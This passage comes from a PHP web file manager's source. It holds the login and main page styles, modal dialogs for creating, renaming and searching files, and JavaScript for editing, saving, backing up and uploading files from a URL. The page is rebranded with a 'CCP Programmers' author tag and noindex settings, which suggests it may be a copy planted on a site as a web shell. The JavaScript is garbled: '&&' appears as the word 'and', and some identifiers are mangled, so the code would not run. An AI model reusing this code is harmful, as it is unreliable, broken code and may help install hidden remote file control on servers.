1 0 0-6 3 3 0 0 0 0 6zm112 176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 180a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 84a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6z'%3E%3C/path%3E%3C/svg%3E");}
        .fm-login-page .brand{ width:121px;overflow:hidden;margin:0 auto;position:relative;z-index:1}
        .fm-login-page .brand img{ width:100%}
        .fm-login-page .card-wrapper{ width:360px;margin-top:10%;margin-left:auto;margin-right:auto;}
        .fm-login-page .card{ border-color:transparent;box-shadow:0 4px 8px rgba(0,0,0,.05)}
        .fm-login-page .card-title{ margin-bottom:1.5rem;font-size:24px;font-weight:400;}
        .fm-login-page .form-control{ border-width:2.3px}
        .fm-login-page .form-group label{ width:100%}
        .fm-login-page .btn.btn-block{ padding:12px 10px}
        .fm-login-page .footer{ margin:40px 0;color:#888;text-align:center}
        @media screen and (max-width:425px){
            .fm-login-page .card-wrapper{ width:90%;margin:0 auto;margin-top:10%;}
        }
        @media screen and (max-width:320px){
            .fm-login-page .card.fat{ padding:0}
            .fm-login-page .card.fat .card-body{ padding:15px}
        }
        .message{ padding:4px 7px;border:1px solid #ddd;background-color:#fff}
        .message.ok{ border-color:green;color:green}
        .message.error{ border-color:red;color:red}
        .message.alert{ border-color:orange;color:orange}
        body.fm-login-page.theme-dark {background-color: #2f2a2a;}
        .theme-dark svg g, .theme-dark svg path {fill: #ffffff; }
    </style>
</head>
<body class="fm-login-page <?php echo (FM_THEME == "dark") ? 'theme-dark' : ''; ?>">
<div id="wrapper" class="container-fluid">

    <?php
    }

    function fm_show_footer_login()
    {
    ?>
</div>
<?php print_external('js-jquery'); ?>
<?php print_external('js-bootstrap'); ?>
</body>
</html>
<?php
}


function fm_show_header()
{
$sprites_ver = '20160315';
header("Content-Type: text/html; charset=utf-8");
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");
header("Pragma: no-cache");

global $lang, $root_url, $sticky_navbar, $favicon_path;
$isStickyNavBar = $sticky_navbar ? 'navbar-fixed' : 'navbar-normal';
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="gilour">
    <meta name="author" content="CCP Programmers">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php if($favicon_path) { echo '<link rel="icon" href="'.fanco($favicon_path).'" type="image/png">'; } ?>
    <title><?php echo fanco(APP_TITLE) ?></title>
    <?php print_external('pre-jsdelivr'); ?>
    <?php print_external('pre-cloudflare'); ?>
    <?php print_external('css-bootstrap'); ?>
    <?php print_external('css-font-awesome'); ?>
    <?php if (FM_USE_HIGHLIGHTJS and isset($_GET['view'])): ?>
    <?php print_external('css-highlightjs'); ?>
    <?php endif; ?>
    <script type="text/javascript">window.csrf = '<?php echo $_SESSION['token']; ?>';</script>
    <style>
        html { -moz-osx-font-smoothing: grayscale; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; height: 100%; scroll-behavior: smooth;}
        *,*::before,*::after { box-sizing: border-box;}
        body { font-size:15px; color:#222;background:#F7F7F7; }
        body.navbar-fixed { margin-top:55px; }
        a, a:hover, a:visited, a:focus { text-decoration:none !important; }
        .filename, td, th { white-space:nowrap  }
        .navbar-brand { font-weight:bold; }
        .nav-item.avatar a { cursor:pointer;text-transform:capitalize; }
        .nav-item.avatar a > i { font-size:15px; }
        .nav-item.avatar .dropdown-menu a { font-size:13px; }
        #search-addon { font-size:12px;border-right-width:0; }
        .brl-0 { background:transparent;border-left:0; border-top-left-radius: 0; border-bottom-left-radius: 0; }
        .brr-0 { border-top-right-radius: 0; border-bottom-right-radius: 0; }
        .bread-crumb { color:#cccccc;font-style:normal; }
        #main-table { transition: transform .25s cubic-bezier(0.4, 0.5, 0, 1),width 0s .25s;}
        #main-table .filename a { color:#222222; }
        .table td, .table th { vertical-align:middle !important; }
        .table .custom-checkbox-td .custom-control.custom-checkbox, .table .custom-checkbox-header .custom-control.custom-checkbox { min-width:18px; display: flex;align-items: center; justify-content: center; }
        .table-sm td, .table-sm th { padding:.4rem; }
        .table-bordered td, .table-bordered th { border:1px solid #f1f1f1; }
        .hidden { display:none  }
        pre.with-hljs { padding:0; overflow: hidden;  }
        pre.with-hljs code { margin:0;border:0;overflow:scroll;  }
        code.maxheight, pre.maxheight { max-height:512px  }
        .fa.fa-caret-right { font-size:1.2em;margin:0 4px;vertical-align:middle;color:#ececec  }
        .fa.fa-home { font-size:1.3em;vertical-align:bottom  }
        .path { margin-bottom:10px  }
        form.dropzone { min-height:200px;border:2px dashed #007bff;line-height:6rem; }
        .right { text-align:right  }
        .center, .close, .login-form, .preview-img-container { text-align:center  }
        .message { padding:4px 7px;border:1px solid #ddd;background-color:#fff  }
        .message.ok { border-color:green;color:green  }
        .message.error { border-color:red;color:red  }
        .message.alert { border-color:orange;color:orange  }
        .preview-img { max-width:100%;max-height:80vh;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5//8/Azbw+PFjrOJMDCSCUQ3EABZc4S0rKzsaSvTTABBgAMyfCMsY4B9iAAAAAElFTkSuQmCC);cursor:zoom-in }
        input#preview-img-zoomCheck[type=checkbox] { display:none }
        input#preview-img-zoomCheck[type=checkbox]:checked ~ label > img { max-width:none;max-height:none;cursor:zoom-out }
        .inline-actions > a > i { font-size:1em;margin-left:5px;background:#3785c1;color:#fff;padding:3px 4px;border-radius:3px; }
        .preview-video { position:relative;max-width:100%;height:0;padding-bottom:62.5%;margin-bottom:10px  }
        .preview-video video { position:absolute;width:100%;height:100%;left:0;top:0;background:#000  }
        .compact-table { border:0;width:auto  }
        .compact-table td, .compact-table th { width:100px;border:0;text-align:center  }
        .compact-table tr:hover td { background-color:#fff  }
        .filename { max-width:420px;overflow:hidden;text-overflow:ellipsis  }
        .break-word { word-wrap:break-word;margin-left:30px  }
        .break-word.float-left a { color:#7d7d7d  }
        .break-word + .float-right { padding-right:30px;position:relative  }
        .break-word + .float-right > a { color:#7d7d7d;font-size:1.2em;margin-right:4px  }
        #editor { position:absolute;right:15px;top:100px;bottom:15px;left:15px  }
        @media (max-width:481px) {
            #editor { top:150px; }
        }
        #normal-editor { border-radius:3px;border-width:2px;padding:10px;outline:none; }
        .btn-2 { padding:4px 10px;font-size:small; }
        li.file:before,li.folder:before { font:normal normal normal 14px/1 FontAwesome;content:"\f016";margin-right:5px }
        li.folder:before { content:"\f114" }
        i.fa.fa-folder-o { color:#0157b3 }
        i.fa.fa-picture-o { color:#26b99a }
        i.fa.fa-file-archive-o { color:#da7d7d }
        .btn-2 i.fa.fa-file-archive-o { color:inherit }
        i.fa.fa-css3 { color:#f36fa0 }
        i.fa.fa-file-code-o { color:#007bff }
        i.fa.fa-code { color:#cc4b4c }
        i.fa.fa-file-text-o { color:#0096e6 }
        i.fa.fa-html5 { color:#d75e72 }
        i.fa.fa-file-excel-o { color:#09c55d }
        i.fa.fa-file-powerpoint-o { color:#f6712e }
        i.go-back { font-size:1.2em;color:#007bff; }
        .main-nav { padding:0.2rem 1rem;box-shadow:0 4px 5px 0 rgba(0, 0, 0, .14), 0 1px 10px 0 rgba(0, 0, 0, .12), 0 2px 4px -1px rgba(0, 0, 0, .2)  }
        .dataTables_filter { display:none; }
        table.dataTable thead .sorting { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAQAAADYWf5HAAAAkElEQVQoz7XQMQ5AQBCF4dWQSJxC5wwax1Cq1e7BAdxD5SL+Tq/QCM1oNiJidwox0355mXnG/DrEtIQ6azioNZQxI0ykPhTQIwhCR+BmBYtlK7kLJYwWCcJA9M4qdrZrd8pPjZWPtOqdRQy320YSV17OatFC4euts6z39GYMKRPCTKY9UnPQ6P+GtMRfGtPnBCiqhAeJPmkqAAAAAElFTkSuQmCC'); }
        table.dataTable thead .sorting_asc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZ0lEQVQ4y2NgGLKgquEuFxBPAGI2ahhWCsS/gDibUoO0gPgxEP8H4ttArEyuQYxAPBdqEAxPBImTY5gjEL9DM+wTENuQahAvEO9DMwiGdwAxOymGJQLxTyD+jgWDxCMZRsEoGAVoAADeemwtPcZI2wAAAABJRU5ErkJggg=='); }
        table.dataTable thead .sorting_desc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZUlEQVQ4y2NgGAWjYBSggaqGu5FA/BOIv2PBIPFEUgxjB+IdQPwfC94HxLykus4GiD+hGfQOiB3J8SojEE9EM2wuSJzcsFMG4ttQgx4DsRalkZENxL+AuJQaMcsGxBOAmGvopk8AVz1sLZgg0bsAAAAASUVORK5CYII='); }
        table.dataTable thead tr:first-child th.custom-checkbox-header:first-child { background-image:none; }
        .footer-action li { margin-bottom:10px; }
        .app-v-title { font-size:24px;font-weight:300;letter-spacing:-.5px;text-transform:uppercase; }
        hr.custom-hr { border-top:1px dashed #8c8b8b;border-bottom:1px dashed #fff; }
        #snackbar { visibility:hidden;min-width:250px;margin-left:-125px;background-color:#333;color:#fff;text-align:center;border-radius:2px;padding:16px;position:fixed;z-index:1;left:50%;bottom:30px;font-size:17px; }
        #snackbar.show { visibility:visible;-webkit-animation:fadein 0.5s, fadeout 0.5s 2.5s;animation:fadein 0.5s, fadeout 0.5s 2.5s; }
        @-webkit-keyframes fadein { from { bottom:0;opacity:0; }
        to { bottom:30px;opacity:1; }
        }
        @keyframes fadein { from { bottom:0;opacity:0; }
        to { bottom:30px;opacity:1; }
        }
        @-webkit-keyframes fadeout { from { bottom:30px;opacity:1; }
        to { bottom:0;opacity:0; }
        }
        @keyframes fadeout { from { bottom:30px;opacity:1; }
        to { bottom:0;opacity:0; }
        }
        #main-table span.badge { border-bottom:2px solid #f8f9fa }
        #main-table span.badge:nth-child(1) { border-color:#df4227 }
        #main-table span.badge:nth-child(2) { border-color:#f8b600 }
        #main-table span.badge:nth-child(3) { border-color:#00bd60 }
        #main-table span.badge:nth-child(4) { border-color:#4581ff }
        #main-table span.badge:nth-child(5) { border-color:#ac68fc }
        #main-table span.badge:nth-child(6) { border-color:#45c3d2 }
        @media only screen and (min-device-width:768px) and (max-device-width:1024px) and (orientation:landscape) and (-webkit-min-device-pixel-ratio:2) { .navbar-collapse .col-xs-6 { padding:0; }
        }
        .btn.active.focus,.btn.active:focus,.btn.focus,.btn.focus:active,.btn:active:focus,.btn:focus { outline:0!important;outline-offset:0!important;background-image:none!important;-webkit-box-shadow:none!important;box-shadow:none!important }
        .lds-facebook { display:none;position:relative;width:64px;height:64px }
        .lds-facebook div,.lds-facebook.show-me { display:inline-block }
        .lds-facebook div { position:absolute;left:6px;width:13px;background:#007bff;animation:lds-facebook 1.2s cubic-bezier(0,.5,.5,1) infinite }
        .lds-facebook div:nth-child(1) { left:6px;animation-delay:-.24s }
        .lds-facebook div:nth-child(2) { left:26px;animation-delay:-.12s }
        .lds-facebook div:nth-child(3) { left:45px;animation-delay:0s }
        @keyframes lds-facebook { 0% { top:6px;height:51px }
        100%,50% { top:19px;height:26px }
        }
        ul#search-wrapper { padding-left: 0;border: 1px solid #ecececcc; } ul#search-wrapper li { list-style: none; padding: 5px;border-bottom: 1px solid #ecececcc; }
        ul#search-wrapper li:nth-child(odd){ background: #f9f9f9cc;}
        .c-preview-img { max-width: 300px; }
        .border-radius-0 { border-radius: 0; }
        .float-right { float: right; }
        .table-hover>tbody>tr:hover>td:first-child { border-left: 1px solid #1b77fd; }
        #main-table tr.even { background-color: #F8F9Fa; }
        .filename>a>i {margin-right: 3px;}
    </style>
    <?php
    if (FM_THEME == "dark"): ?>
        <style>
            :root {
                --bs-bg-opacity: 1;
                --bg-color: #f3daa6;
                --bs-dark-rgb: 28, 36, 41 !important;
                --bs-bg-opacity: 1;
            }
            .table-dark { --bs-table-bg: 28, 36, 41 !important; }
            .btn-primary { --bs-btn-bg: #26566c; --bs-btn-border-color: #26566c; }
            body.theme-dark { background-image: linear-gradient(90deg, #1c2429, #263238); color: #CFD8DC; }
            .list-group .list-group-item { background: #343a40; }
            .theme-dark .navbar-nav i, .navbar-nav .dropdown-toggle, .break-word { color: #CFD8DC; }
            a, a:hover, a:visited, a:active, #main-table .filename a, i.fa.fa-folder-o, i.go-back { color: var(--bg-color); }
            ul#search-wrapper li:nth-child(odd) { background: #212a2f; }
            .theme-dark .btn-outline-primary { color: #b8e59c; border-color: #b8e59c; }
            .theme-dark .btn-outline-primary:hover, .theme-dark .btn-outline-primary:active { background-color: #2d4121;}
            .theme-dark input.form-control { background-color: #101518; color: #CFD8DC; }
            .theme-dark .dropzone { background: transparent; }
            .theme-dark .inline-actions > a > i { background: #79755e; }
            .theme-dark .text-white { color: #CFD8DC !important; }
            .theme-dark .table-bordered td, .table-bordered th { border-color: #343434; }
            .theme-dark .table-bordered td .custom-control-input, .theme-dark .table-bordered th .custom-control-input { opacity: 0.678; }
            .message { background-color: #212529; }
            .compact-table tr:hover td { background-color: #3d3d3d; }
            #main-table tr.even { background-color: #21292f; }
            form.dropzone { border-color: #79755e; }
        </style>
    <?php endif; ?>
</head>
<body class="<?php echo (FM_THEME == "dark") ? 'theme-dark' : ''; ?> <?php echo $isStickyNavBar; ?>">
<div id="wrapper" class="container-fluid">
    <!-- New Item creation -->
    <div class="modal fade" id="createNewItem" tabindex="-1" role="dialog" data-bs-backdrop="static" data-bs-keyboard="false" aria-labelledby="newItemModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <form class="modal-content <?php echo fm_get_theme(); ?>" method="post">
                <div class="modal-header">
                    <h5 class="modal-title" id="newItemModalLabel"><i class="fa fa-plus-square fa-fw"></i><?php echo lng('CreateNewItem') ?></h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <p><label for="newfile"><?php echo lng('ItemType') ?> </label></p>
                    <div class="form-check form-check-inline">
                      <input class="form-check-input" type="radio" name="newfile" id="customRadioInline1" name="newfile" value="file">
                      <label class="form-check-label" for="customRadioInline1"><?php echo lng('File') ?></label>
                    </div>
                    <div class="form-check form-check-inline">
                      <input class="form-check-input" type="radio" name="newfile" id="customRadioInline2" value="folder" checked>
                      <label class="form-check-label" for="customRadioInline2"><?php echo lng('Folder') ?></label>
                    </div>

                    <p class="mt-3"><label for="newfilename"><?php echo lng('ItemName') ?> </label></p>
                    <input type="text" name="newfilename" id="newfilename" value="" class="form-control" placeholder="<?php echo lng('Enter here...') ?>" required>
                </div>
                <div class="modal-footer">
                    <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                    <button type="button" class="btn btn-outline-primary" data-bs-dismiss="modal"><i class="fa fa-times-circle"></i> <?php echo lng('Cancel') ?></button>
                    <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo lng('CreateNow') ?></button>
                </div>
            </form>
        </div>
    </div>

    <!-- Advance Search Modal -->
    <div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
      <div class="modal-dialog modal-lg" role="document">
        <div class="modal-content <?php echo fm_get_theme(); ?>">
          <div class="modal-header">
            <h5 class="modal-title col-10" id="searchModalLabel">
                <div class="input-group mb-3">
                  <input type="text" class="form-control" placeholder="<?php echo lng('Search') ?> <?php echo lng('a files') ?>" aria-label="<?php echo lng('Search') ?>" aria-describedby="search-addon3" id="advanced-search" autofocus required>
                  <span class="input-group-text" id="search-addon3"><i class="fa fa-search"></i></span>
                </div>
            </h5>
            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
          </div>
          <div class="modal-body">
            <form action="" method="post">
                <div class="lds-facebook"><div></div><div></div><div></div></div>
                <ul id="search-wrapper">
                    <p class="m-2"><?php echo lng('Search file in folder and subfolders...') ?></p>
                </ul>
            </form>
          </div>
        </div>
      </div>
    </div>

    <!--Rename Modal -->
    <div class="modal modal-alert" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="renameDailog">
      <div class="modal-dialog" role="document">
        <form class="modal-content rounded-3 shadow <?php echo fm_get_theme(); ?>" method="post" autocomplete="off">
          <div class="modal-body p-4 text-center">
            <h5 class="mb-3"><?php echo lng('Are you sure want to rename?') ?></h5>
            <p class="mb-1">
                <input type="text" name="rename_to" id="js-rename-to" class="form-control" placeholder="<?php echo lng('Enter new file name') ?>" required>
                <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                <input type="hidden" name="rename_from" id="js-rename-from">
            </p>
          </div>
          <div class="modal-footer flex-nowrap p-0">
            <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php echo lng('Cancel') ?></button>
            <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0"><strong><?php echo lng('Okay') ?></strong></button>
          </div>
        </form>
      </div>
    </div>

    <!-- Confirm Modal -->
    <script type="text/html" id="js-tpl-confirm">
        <div class="modal modal-alert confirmDailog" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="confirmDailog-<%this.id%>">
          <div class="modal-dialog" role="document">
            <form class="modal-content rounded-3 shadow <?php echo fm_get_theme(); ?>" method="post" autocomplete="off" action="<%this.action%>">
              <div class="modal-body p-4 text-center">
                <h5 class="mb-2"><?php echo lng('Are you sure want to') ?> <%this.title%> ?</h5>
                <p class="mb-1"><%this.content%></p>
              </div>
              <div class="modal-footer flex-nowrap p-0">
                <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php echo lng('Cancel') ?></button>
                <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0" data-bs-dismiss="modal"><strong><?php echo lng('Okay') ?></strong></button>
              </div>
            </form>
          </div>
        </div>
    </script>

    <?php
    }


    function fm_show_footer()
    {
    ?>
</div>
<?php print_external('js-jquery'); ?>
<?php print_external('js-bootstrap'); ?>
<?php print_external('js-jquery-datatables'); ?>
<?php if (FM_USE_HIGHLIGHTJS and isset($_GET['view'])): ?>
    <?php print_external('js-highlightjs'); ?>
    <script>hljs.highlightAll(); var isHighlightingEnabled = true;</script>
<?php endif; ?>
<script>
    function template(html,options){
        var re=/<\%([^\%>]+)?\%>/g,reExp=/(^( )?(if|for|else|switch|case|break|{|}))(.*)?/g,code='var r=[];\n',cursor=0,match;var add=function(line,js){js?(code+=line.match(reExp)?line+'\n':'r.push('+line+');\n'):(code+=line!=''?'r.push("'+line.replace(/"/g,'\\"')+'");\n':'');return add}
        while(match=re.exec(html)){add(html.slice(cursor,match.index))(match[1],!0);cursor=match.index+match[0].length}
        add(html.substr(cursor,html.length-cursor));code+='return r.join("");';return new Function(code.replace(/[\r\t\n]/g,'')).apply(options)
    }
    function rename(e, t) { if(t) { $("#js-rename-from").val(t);$("#js-rename-to").val(t); $("#renameDailog").modal('show'); } }
    function change_checkboxes(e, t) { for (var n = e.length - 1; n >= 0; n--) e[n].checked = "boolean" == typeof t ? t : !e[n].checked }
    function get_checkboxes() { for (var e = document.getElementsByName("file[]"), t = [], n = e.length - 1; n >= 0; n--) (e[n].type = "checkbox") and t.push(e[n]); return t }
    function select_all() { change_checkboxes(get_checkboxes(), !0) }
    function unselect_all() { change_checkboxes(get_checkboxes(), !1) }
    function invert_all() { change_checkboxes(get_checkboxes()) }
    function checkbox_toggle() { var e = get_checkboxes(); e.push(this), change_checkboxes(e) }
    function backup(e, t) {
        var n = new XMLHttpRequest,
            a = "path=" + e + "&file=" + t + "&token="+ window.csrf +"&type=backup&ajax=true";
        return n.open("POST", "", !0), n.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), n.onreadystatechange = function () {
            4 == n.readyState and 200 == n.status and toast(n.responseText)
        }, n.send(a), !1
    }
    // Toast message
    function toast(txt) { var x = document.getElementById("snackbar");x.innerHTML=txt;x.className = "show";setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000); }
    // Save file
    function edit_save(e, t) {
        var n = "ace" == t ? editor.getSession().getValue() : document.getElementById("normal-editor").value;
        if (typeof n !== 'undefined' and n !== null) {
            if (true) {
                var data = {ajax: true, content: n, type: 'save', token: window.csrf};

                $.ajax({
                    type: "POST",
                    url: window.location,
                    data: JSON.stringify(data),
                    contentType: "application/json; charset=utf-8",
                    success: function(mes){toast("Saved Successfully"); window.onbeforeunload = function() {return}},
                    failure: function(mes) {toast("Error: try again");},
                    error: function(mes) {toast(`<p style="background-color:red">${mes.responseText}</p>`);}
                });
            } else {
                var a = document.createElement("form");
                a.setAttribute("method", "POST"), a.setAttribute("action", "");
                var o = document.createElement("textarea");
                o.setAttribute("type", "textarea"), o.setAttribute("name", "savedata");
                let cx = document.createElement("input"); cx.setAttribute("type", "hidden");cx.setAttribute("name", "token");cx.setAttribute("value", window.csrf);
                var c = document.createTextNode(n);
                o.appendChild(c), a.appendChild(o), a.appendChild(cx), document.body.appendChild(a), a.submit()
            }
        }
    }
    function show_new_pwd() { $(".js-new-pwd").toggleClass('hidden'); }
    // Save Settings
    function save_settings($this) {
        let form = $($this);
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            success: function (data) {if(data) { window.location.reload();}}
        }); return false;
    }
    //Create new password hash
    function new_password_hash($this) {
        let form = $($this), $pwd = $("#js-pwd-result"); $pwd.val('');
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            success: function (data) { if(data) { $pwd.val(data); } }
        }); return false;
    }
    // Upload files using URL @param {Object}
    function upload_from_url($this) {
        let form = $($this), resultWrapper = $("div#js-url-upload__list");
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            beforeSend: function() { form.find("input[name=uploadurl]").attr("disabled","disabled"); form.find("button").hide(); form.find(".lds-facebook").addClass('show-me'); },
            success: function (data) {
                if(data) {
                    data = JSON.parse(data);
                    if(data.done) {
                        resultWrapper.append('<div class="alert alert-success row">Uploaded Successful: '+data.done.name+'</div>'); form.find("input[name=uploadurl]").val('');
                    } else if(data['fail']) { resultWrapper.append('<div class="alert alert-danger row">Error: '+data.fail.message+'</div>'); }
                    form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');
                }
            },
            error: function(xhr) {
                form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');console.error(xhr);
            }
        }); return false;
    }
    // Search template
    function search_template(data) {
        var response = "";
        $.each(data, function (key, val) {
            response += `<li><a href="?p=${val.path}&view=${val.name}">${val.path}/${val.name}</a></li>`;
        });
        return response;
    }
    // Advance search
    function fm_search() {
        var searchTxt = $("input#advanced-search").val(), searchWrapper = $("ul#search-wrapper"), path = $("#js-search-modal").attr("href"), _html = "", $loader = $("div.lds-facebook");
        if(!!searchTxt and searchTxt.length > 2 and path) {
            var data = {ajax: true, content: searchTxt, path:path, type: 'search', token: window.csrf };
            $.ajax({
                type: "POST",
                url: window.location,
                data: data,
                beforeSend: function() {
                    searchWrapper.html('');
                    $loader.addClass('show-me');
                },
                success: function(data){
                    $loader.removeClass('show-me');
                    data = JSON.parse(data);
                    if(data and data.length) {
                        _html = search_template(data);
                        searchWrapper.html(_html);
                    } else { searchWrapper.html('<p class="m-2">No result found!<p>'); }
                },
                error: function(xhr) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>'); },
                failure: function(mes) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>');}
            });
        } else { searchWrapper.html("OOPS: minimum 3 characters required!"); }
    }

    // action confirm dailog modal
    function confirmDailog(e, id = 0, title = "Action", content = "", action = null) {
        e.preventDefault();
        const tplObj = {id, title, content: decodeURIComponent(content.replace(/\+/g, ' ')), action};
        let tpl = $("#js-tpl-confirm").html();
        $(".modal.confirmDailog").remove();
        $('#wrapper').append(template(tpl,tplObj));
        const $confirmDailog = $("#confirmDailog-"+tplObj.id);
        $confirmDailog.modal('show');
        return false;
    }
    

    // on mouse hover image preview
    !function(s){s.previewImage=function(e){var o=s(document),t=".previewImage",a=s.extend({xOffset:20,yOffset:-20,fadeIn:"fast",css:{padding:"5px",border:"1px solid #cccccc","background-color":"#fff"},eventSelector:"[data-preview-image]",dataKey:"previewImage",overlayId:"preview-image-plugin-overlay"},e);return o.off(t),o.on("mouseover"+t,a.eventSelector,function(e){s("p#"+a.overlayId).remove();var o=s("<p>").attr("id",a.overlayId).css("position","absolute").css("display","none").append(s('<img class="c-preview-img">').attr("src",s(this).data(a.dataKey)));a.cssando.css(a.css),s("body").append(o),o.css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px").fadeIn(a.fadeIn)}),o.on("mouseout"+t,a.eventSelector,function(){s("#"+a.overlayId).remove()}),o.on("mousemove"+t,a.eventSelector,function(e){s("#"+a.overlayId).css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px")}),this},s.previewImage()}(jQuery);

    // Dom Ready Events
    $(document).ready( function () {
        // dataTable init
        var $table = $('#main-table'),
            tableLng = $table.find('th').length,
            _targets = (tableLng and tableLng == 7 ) ? [0, 4,5,6] : tableLng == 5 ? [0,4] : [3];
            mainTable = $('#main-table').DataTable({paging: false, info: false, order: [], columnDefs: [{targets: _targets, orderable: false}]
        });
        // filter table
        $('#search-addon').on( 'keyup', function () {
            mainTable.search( this.value ).draw();
        });
        $("input#advanced-search").on('keyup', function (e) {
            if (e.keyCode === 13) { fm_search(); }
        });
        $('#search-addon3').on( 'click', function () { fm_search(); });
        //upload nav tabs
        $(".fm-upload-wrapper .card-header-tabs").on("click", 'a', function(e){
            e.preventDefault();let target=$(this).data('target');
            $(".fm-upload-wrapper .card-header-tabs a").removeClass('active');$(this).addClass('active');
            $(".fm-upload-wrapper .card-tabs-container").addClass('hidden');$(target).removeClass('hidden');
        });
    });
</script>
<?php if (isset($_GET['edit']) and isset($_GET['env']) and FM_EDIT_FILE and !FM_READONLY):
        
        $ext = pathinfo($_GET["edit"], PATHINFO_EXTENSION);
        $ext =  $ext == "js" ? "javascript" :  $ext;
        ?>
    <?php print_external('js-ace'); ?>
    <script>
        var editor = ace.edit("editor");
        editor.getSession().setMode( {path:"ace/mode/<?php echo $ext; ?>", inline:true} );
        //editor.setTheme("ace/theme/twilight"); //Dark Theme
        editor.setShowPrintMargin(false); // Hide the vertical ruler
        function ace_commend (cmd) { editor.commands.exec(cmd, editor); }
        editor.commands.addCommands([{
            name: 'save', bindKey: {win: 'Ctrl-S',  mac: 'Command-S'},
            exec: function(editor) { edit_save(this, 'ace'); }
        }]);
        function renderThemeMode() {
            var $modeEl = $("select#js-ace-mode"), $themeEl = $("select#js-ace-theme"), $fontSizeEl = $("select#js-ace-fontSize"), optionNode = function(type, arr){ var $Option = ""; $.each(arr, function(i, val) { $Option += "<option value='"+type+i+"'>" + val + "</option>"; }); return $Option; },
                _data = {"aceTheme":{"bright":{"chrome":"Chrome","clouds":"Clouds","crimson_editor":"Crimson Editor","dawn":"Dawn","dreamweaver":"Dreamweaver","eclipse":"Eclipse","github":"GitHub","iplastic":"IPlastic","solarized_light":"Solarized Light","textmate":"TextMate","tomorrow":"Tomorrow","xcode":"XCode","kuroir":"Kuroir","katzenmilch":"KatzenMilch","sqlserver":"SQL Server"},"dark":{"ambiance":"Ambiance","chaos":"Chaos","clouds_midnight":"Clouds Midnight","dracula":"Dracula","cobalt":"Cobalt","gruvbox":"Gruvbox","gob":"Green on Black","idle_fingers":"idle Fingers","kr_theme":"krTheme","merbivore":"Merbivore","merbivore_soft":"Merbivore Soft","mono_industrial":"Mono Industrial","monokai":"Monokai","pastel_on_dark":"Pastel on dark","solarized_dark":"Solarized Dark","terminal":"Terminal","tomorrow_night":"Tomorrow Night","tomorrow_night_blue":"Tomorrow Night Blue","tomorrow_night_bright":"Tomorrow Night Bright","tomorrow_night_eighties":"Tomorrow Night 80s","twilight":"Twilight","vibrant_ink":"Vibrant Ink"}},"aceMode":{"javascript":"JavaScript","abap":"ABAP","abc":"ABC","actionscript":"ActionScript","ada":"ADA","apache_conf":"Apache Conf","asciidoc":"AsciiDoc","asl":"ASL","assembly_x86":"Assembly x86","autohotkey":"AutoHotKey","apex":"Apex","batchfile":"BatchFile","bro":"Bro","c_cpp":"C and C++","c9search":"C9Search","cirru":"Cirru","clojure":"Clojure","cobol":"Cobol","coffee":"CoffeeScript","coldfusion":"ColdFusion","csharp":"C#","csound_document":"Csound 